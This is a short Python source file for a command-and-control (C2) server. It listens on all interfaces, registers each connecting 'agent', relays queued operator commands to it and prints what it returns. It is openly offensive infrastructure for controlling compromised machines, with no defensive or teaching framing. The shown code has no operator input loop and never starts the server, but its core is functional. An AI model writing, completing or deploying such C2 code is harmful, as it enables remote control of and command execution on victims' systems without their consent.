import socket
import threading
from queue import Queue

HOST = "0.0.0.0"   # listen on all interfaces
PORT = 5005

agents = {}
agent_counter = 0
lock = threading.Lock()


class Agent:
    def __init__(self, agent_id, conn, addr):
        self.id = agent_id
        self.conn = conn
        self.addr = addr
        self.queue = Queue()


def handle_agent(agent: Agent):
    print(f"[+] Agent {agent.id} connected from {agent.addr}")

    try:
        while True:
            # wait for operator command
            command = agent.queue.get()
            if not command:
                continue

            agent.conn.sendall(command.encode())

            if command.lower() == "quit":
                break

            # receive output
            output = agent.conn.recv(8192)
            if not output:
                break

            print(f"\n[Agent {agent.id} Output]\n{output.decode()}\n")

    except Exception as e:
        print(f"[-] Agent {agent.id} error: {e}")

    finally:
        agent.conn.close()
        with lock:
            agents.pop(agent.id, None)
        print(f"[-] Agent {agent.id} disconnected")


def start_server():
    global agent_counter

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    server_socket.bind((HOST, PORT))
    server_socket.listen(5)

    print(f"[+] C2 listening on {HOST}:{PORT}")

    while True:
        conn, addr = server_socket.accept()

        with lock:
            agent_counter += 1
            agent = Agent(agent_counter, conn, addr)
            agents[agent_counter] = agent

        thread = threading.Thread(
            target=handle_agent,
            args=(agent,),
            daemon=True
        )
        thread.start()
